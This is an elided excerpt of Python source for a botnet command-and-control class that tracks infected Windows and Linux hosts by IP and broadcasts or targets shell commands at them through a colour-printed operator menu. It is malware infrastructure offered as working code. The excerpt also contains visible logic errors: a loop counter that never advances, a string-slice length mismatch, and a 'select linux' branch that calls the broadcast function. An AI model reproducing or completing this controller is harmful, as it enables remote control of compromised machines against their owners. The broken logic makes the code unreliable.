...
IP_ADDRESSES = [[],[]] # A list containing the IP addresses of both Win/Lin machines. Seperate lists.
...
class BotnetCmdCtrl:
	...
	def get_command(self):
		...
		while cmd != 'quit':
			if cmd == 'list linux': 
				...
				resp_list = self.send_cmd_all_linux(cmd[6:])
				i = 0
				for output in resp_list:
					if i % 2 == 1 and self.output_to_file:
						print(output)
					elif i % 2 == 1 and not self.output_to_file:
						print(output)
				...
				resp_list = self.send_cmd_all_windows(cmd[8:])
				i = 0
				for output in resp_list:
					if i % 2 == 1 and self.output_to_file:
						print(output)
			...
			elif cmd[:13] == 'select windows':
				self.send_cmd_target_windows(cmd[14:])

			elif cmd[:13] == 'select linux':
				self.send_cmd_all_linux(cmd[14:])
	...
	def send_cmd_target_linux(self, ip_index: int):
	...
	def send_cmd_target_windows(self, ip_index: int):
	...
	def help(self):
		"""This function will print the help menu.
			...
			Returns:
				None
		"""
		print(PURPLE, 'Commands: ', RESET)
		print(ORANGE, '  list linux ->', RESET, 'Lists all the Linux connections (IPs).')
		print(ORANGE, '  list windows ->', RESET, 'Lists all the Windows connections (IPs).')
		print(ORANGE, '  count linux ->', RESET, 'Lists the amount of Linux connections (int).')
		print(ORANGE, '  count windows ->', RESET, 'Lists the amount of Windows connections (int).')
		print(ORANGE, '  linux ->', RESET, 'Send command to all Linux machines.')
		print(ORANGE, '  windows ->', RESET, 'Send command to all Windows machines.')
		print(ORANGE, '  select ->', RESET, 'Select a number from list outputs and connect to one target.')
		print(ORANGE, '  switch ->', RESET, 'Write output of command to stdout and file.')
		print(ORANGE, '  clear ->', RESET, 'Clear the screen.')
		print(ORANGE, '  quit ->', RESET, "Quit the program.")
	...
	def start(self):
		"""This function will initiate the program.
			...
			Returns:
				None
		"""
		self.create_threads() # Call functions to create threads
